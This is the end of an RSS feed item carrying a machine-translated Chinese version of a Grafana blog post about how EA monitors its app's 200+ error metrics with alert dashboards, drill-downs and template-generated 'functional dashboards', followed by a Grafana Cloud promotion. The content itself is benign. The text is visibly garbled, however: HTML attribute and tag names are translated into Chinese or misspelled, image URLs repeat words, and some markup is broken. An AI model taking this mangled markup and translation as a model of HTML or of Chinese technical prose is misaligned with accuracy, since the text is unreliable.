&lt;/h2&gt;&#xA;&lt;p&gt;今天，而不是看着EA团队是一个压倒性的仪表板，有一个仪表板，他们可以更好地观察解决外部问题，回归，固定错误和已解决的外部问题等事物。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/ea-dashboard/image-ea-dashboard-multi-panels.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard-multi-panels.png” data-srcset =“/媒体/blog/ea-dashboard/image-ea-dashboard-ea-dashboard-multi-panels.png？w = 320 320w？ /media/blog/ea-dashboard/image-ea-dashboard-multi-panels.png?w=750 750W，/media/Media/ea-ea-dashboard/image-eage-age-ea-dashboard-dashboard-dashboard-multi-panels.png？ /media/blog/ea-dashboard/image-ea-dashboard-multi-panels.png?w=1240 1240W，/media/blog/ea-dashboard/image-ea-dashboard-dashboard-multi-panels.png？&#xA;data-sizes =“ auto” alt =“面板的屏幕截图；带有红色错误框的四个标记为外部问题，回归，错误固定和外部解决“ width =” 960“ height =” 540“/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/ea-dashboard/image-ea-dashboard-multi-panels.png”&#xA;alt =“面板的屏幕截图；四个带有红色错误框的屏幕截图标记为外部问题，回归，固定错误和外部解决的“ width =“ 960” height =“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;建立了坚实的阈值后，团队为每个指标设置警报，为他们提供24/7的覆盖范围。结果，自实施此新系统以来，他们并没有错过任何由自己的代码更改造成的关键错误。&lt;/p&gt;&#xA;&lt;h2 id =“移动beyond-entection”&gt;超越检测&lt;/h2&gt;&#xA;&lt;p&gt; ea的应用程序没有传统的后端设置，其中包含单独的指标，日志和痕迹 - “您无法认真地将所有日志从用户的计算机发送到我们的服务器，” Chen解释说。因此，在找到错误原因时，团队不能简单地潜入日志中。相反，EA仅收集一些具有错误类型和几个字段作为上下文的匿名JSON事件。&lt;/p&gt;&#xA;&lt;p&gt;设置了应用程序仪表板，因此，如果某人看到错误率峰值，例如，他们可以单击面板中的图形并详细介绍有关错误上下文的更多信息。陈说：“这些背景可以帮助我们找出根本原因。”团队还可以通过应用程序版本或游戏ID分解问题。陈说：“我们可以在本地测试这些游戏，并尝试重现该问题，甚至可以与游戏团队联系。” “无论哪种方式，这些都是可行的见解。” &lt;/p&gt;&#xA;他解释说，&lt;p&gt;仍然没有扩展，因此，如果EA拥有200个指标，并且每个指标都有10个值得崩溃的字段，则结果是另外2,000个面板。 “这是不可能的。” &lt;/p&gt;&#xA;&lt;p&gt;这是他对功能仪表板的想法。&lt;/p&gt;&#xA;&lt;p&gt;“核心想法是仪表板不是静态页面，而是功能，”他说。 “您可以通过使用不同的参数访问URL来调用它们，然后获得所需的仪表板。” &lt;/p&gt;&#xA;&lt;p&gt;通过使用下面的功能，开发人员可以获取所需的仪表板。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;style =“最大宽度：960px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/ea-dashboard/image-ea-dashboard-function-call.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/ea-dashboard/image-ea-dashboard-function-call.png” data-srcset =“/媒体/媒体/blog/ea-dashboard/image-ea-dashboard-function-function-call.png？ /media/blog/EA-dashboard/image-EA-dashboard-function-call.png?w=750 750w, /media/blog/EA-dashboard/image-EA-dashboard-function-call.png?w=900 900w, /media/blog/EA-dashboard/image-EA-dashboard-function-call.png?w=1040 1040w, /Media/blog/ea-dashboard/image-ea-dashboard-function-call.png?w=1240 1240W，/media/blog/ea-dashboard/image-image-ea-dashboard-dashboard-function-function-call.png?w=19201920w“&#xA;data-sizes =“ auto” alt =“函数呼叫公式的图像：fn deepdive（field_breakdown，query_error，query_startup，...） - &gt; dashboard“ width =“ 960” height =“ 540”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/ea-dashboard/image-ea-dashboard-function-call.png”&#xA;alt =“函数呼叫公式的图像：fn deepdive（field_breakdown，query_error，query_startup，...） - &gt; dashboard“ width =“ 960” height =“ 540”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt; chen然后在工作中对功能仪表板进行了快速演示，解释了幕后发生的事情，并分享了如何为参数制作链接。&lt;/p&gt;&#xA;&lt;p&gt;他还指出了维护这种类型的仪表板的容易性。 EA的警报仪表板有200多个警报，是由模板生成的。他说：“一旦定义了查询，其他所有内容都会由脚本自动生成。” “这真的很容易扩展，我们有管道来计算历史的三个Sigma阈值，并每周重建所有内容，因此始终是最新的。” &lt;/p&gt;&#xA;&lt;p&gt;要了解更多信息，请查看陈的演讲：“&#xA;&lt;a href =“/events/grafanacon/2025/electronic-arts-how-to-monitor-metrors-metrics/？pg = blog＆plcmt = body-txt = body-txt“&gt;监视EA App的200+核心错误指标，具有可扩展的，颜色编码的Grafana Dashboard &lt;/a&gt;”。&#xA;&lt;p&gt; &lt;em&gt;&#xA;&lt;a href =“/products/cloud/？pg = blog＆plcmt = body-txt”&gt; grafana cloud &lt;/a&gt;是从指标，日志，痕迹，痕迹，仪表板等开始的最简单方法。我们有一个宽敞的永远的层次，并为每个用例都有计划。&#xA;&lt;a href =“/auth/insig-up/create-user/？pg = blog＆plcmt = body-txt“&gt;现在免费注册&lt;/a&gt;！&lt;/em&gt; &lt;/p&gt;</description>
      <pubDate>Mon, 07 Jul 2025 00:00:00 +0000</pubDate>
    </item>
  </channel>
</rss>